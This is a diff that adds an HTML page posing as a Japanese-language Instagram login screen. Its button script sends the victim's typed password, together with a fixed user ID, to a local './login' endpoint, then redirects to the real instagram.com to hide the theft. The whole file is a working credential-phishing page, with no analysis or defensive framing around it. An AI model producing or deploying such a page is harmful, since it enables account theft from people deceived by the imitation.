@@ -1,0 +1,43 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Instagram ログイン</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css">
+    </head>
+    <body>
+    <section class="hero is-dark is-fullheight">
+    <div class="hero-body"> <div class="container">
+    <div class="columns is-centered">
+    <div class="column is-5-tablet is-4-desktop is-3-widescreen">
+    <form action="" class="box is-centered" method="post">
+    <figure class="image">
+    <img src="logo.png">
+    </figure>
+    <div class="columns is-centered">
+    <figure class="image is-128x128" style="margin: 32px;"> 
+    <img src="icon.jpg" class="is-rounded">
+    </figure>
+</div>
+<div class="field">
+<div class="control">
+<input id="password" type="password" placeholder="パスワード" class="input" required>
+</div>
+</div>
+
+<div class="field">
+<button class="button is-info" onclick='(() => {
+fetch(`./login?id=USERID&password=${document.querySelector("#password").value}`)
+.then(() => location.href = "https://instagram.com")
+})()'>
+ログイン
+</button>
+</div>
+</form>
+</div>
+</div>
+</div>
+</div>
+</section>
+</body>
